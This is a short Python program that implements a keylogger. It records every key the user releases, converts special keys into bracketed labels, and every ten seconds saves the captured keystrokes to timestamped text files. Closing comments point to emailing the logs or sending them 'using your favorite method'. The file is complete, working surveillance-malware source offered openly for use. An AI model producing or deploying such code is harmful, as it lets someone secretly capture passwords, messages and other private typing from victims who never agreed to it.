import keyboard  # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

REPORT_INTERVAL = 10


class Keylogger:
    def __init__(self, interval):
        self.interval = interval

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        string = event.name
        if len(string) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if string == "space":
                # " " instead of "space"
                string = " "
            elif string == "enter":
                # add a new line whenever an ENTER is pressed
                string = "[ENTER]\n"
            elif string == "decimal":
                string = "."
            else:
                # replace spaces with underscores
                string = string.replace(" ", "_")
                string = f"[{string.upper()}]"
        self.log += string

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):

        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=REPORT_INTERVAL)
    keylogger.start()
